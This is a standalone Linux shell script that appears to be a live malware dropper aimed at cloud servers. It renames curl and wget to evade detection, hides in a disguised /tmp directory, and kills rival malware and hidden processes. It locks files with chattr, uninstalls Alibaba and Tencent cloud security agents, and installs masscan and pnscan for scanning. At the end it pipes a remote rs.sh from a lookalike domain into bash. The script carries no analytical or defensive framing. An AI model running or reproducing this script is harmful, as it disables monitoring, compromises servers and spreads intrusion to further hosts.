#!/bin/sh
rtdir="/etc/svcupdates"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cd1"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wd1"
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/url /usr/bin/cd1
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/get /usr/bin/wd1
sleep $( seq 3 7 | sort -R | head -n1 )
cd /tmp || cd /var/tmp
sleep 1
mkdir -p .ice-unix/... && chmod -R 777 .ice-unix && cd .ice-unix/...
sleep 1
if [ -f .watch ]; then
rm -rf .watch
exit 0
fi
sleep 1
echo 1 > .watch
sleep 1
ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2>/dev/null
ps x | awk '!/awk/ && /barad_agent|masscan|\.sr0|clay|udevs|\.sshd|xig/ {print $1}' | xargs kill -9 2>/dev/null
sleep 1
if [ -x "$(command -v apt-get)" ]; then
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y debconf-doc
apt-get install -y build-essential
apt-get install -y libpcap0.8-dev libpcap0.8
apt-get install -y libpcap*
apt-get install -y make gcc git
apt-get install -y redis-server
apt-get install -y redis-tools
apt-get install -y redis
apt-get install -y iptables
#apt-get install -y wget curl
apt-get install -y unhide
fi
if [ -x "$(command -v yum)" ]; then
yum update -y
yum install -y epel-release
yum update -y
yum install -y git iptables make gcc redis libpcap libpcap-devel
#yum install -y wget curl
yum install -y unhide
fi
sleep 1
echo "Software Installed"

dddir="/usr/sbin/unhide"
$dddir quick |grep PID:|awk '{print $4}'|xargs -I % kill -9 % 2>/dev/null
chattr -i /usr/bin/ip6network
chattr -i /usr/bin/kswaped
chattr -i /usr/bin/irqbalanced
chattr -i /usr/bin/rctlcli
chattr -i /usr/bin/systemd-network
chattr -i /usr/bin/pamdicks
echo 1 > /usr/bin/ip6network
echo 2 > /usr/bin/kswaped
echo 3 > /usr/bin/irqbalanced
echo 4 > /usr/bin/rctlcli
echo 5 > /usr/bin/systemd-network
echo 6 > /usr/bin/pamdicks
chattr +i /usr/bin/ip6network
chattr +i /usr/bin/kswaped
chattr +i /usr/bin/irqbalanced
chattr +i /usr/bin/rctlcli
chattr +i /usr/bin/systemd-network
chattr +i /usr/bin/pamdicks

downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
	echo $1,$2
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        else
            curl --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cd1" ]
    then
        http_code = `cd1 -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cd1 --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cd1 --connect-timeout 10 --retry 100 $1 > $2
        else
            cd1 --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=10 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
	then
		wget --timeout=10 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wd1" ]
    then
        wd1 --timeout=10 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wd1 --timeout=10 --tries=100 -O $2 $3
        fi
    fi
}

if ps aux | grep -i '[a]liyun'; then
  downloads http://update.aegis.aliyun.com/download/uninstall.sh | bash
  downloads http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
sleep 1
echo "DER Uninstalled"
if ! [ -x "$(command -v masscan)" ]; then
rm -rf /var/lib/apt/lists/*
rm -rf x1.tar.gz
sleep 1
$bbdira -sL -o x1.tar.gz http://global.bitmex.com.de/b2f627fff19fda/1.0.4.tar.gz
sleep 1
[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4
echo "Masscan Installed"
fi
echo "Masscan Already Installed"
sleep 3 && rm -rf .watch
if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
$bbdira -kLs ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz > .x112 || $ccdira -q -O .x112 ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz
sleep 1
[ -f .x112 ] && tar xf .x112&& cd pnscan-1.11 && make lnx && make install&& cd .. && rm -rf pnscan-1.11 .x112
echo "Pnscan Installed"
fi
echo "Pnscan Already Installed"

$bbdir -fsSL http://global.bitmex.com.de/b2f627fff19fda/rs.sh | bash
$bbdira -fsSL http://global.bitmex.com.de/b2f627fff19fda/rs.sh | bash
